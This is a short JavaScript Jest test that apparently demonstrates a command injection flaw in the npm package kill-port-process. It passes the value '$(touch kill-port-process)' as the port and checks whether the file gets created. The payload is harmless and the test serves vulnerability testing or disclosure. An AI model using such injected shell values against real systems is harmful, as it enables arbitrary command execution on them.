test("Command Injection in kill-port-process", () => {
  expect.assertions(2);
  const killPortProcess = require("kill-port-process");
  const fs = require("fs");
  const path = "./kill-port-process";
  const PORT = "$(touch kill-port-process)";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return killPortProcess(PORT)
    .then(() => {
      console.log("here!");
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
    })
    .catch((err) => {})
    .finally(() => {
      console.log("here!!!!");
      if (fs.existsSync(path)) {
        fs.unlinkSync(path);
        console.log("File removed!:", path);
      }
    });
});
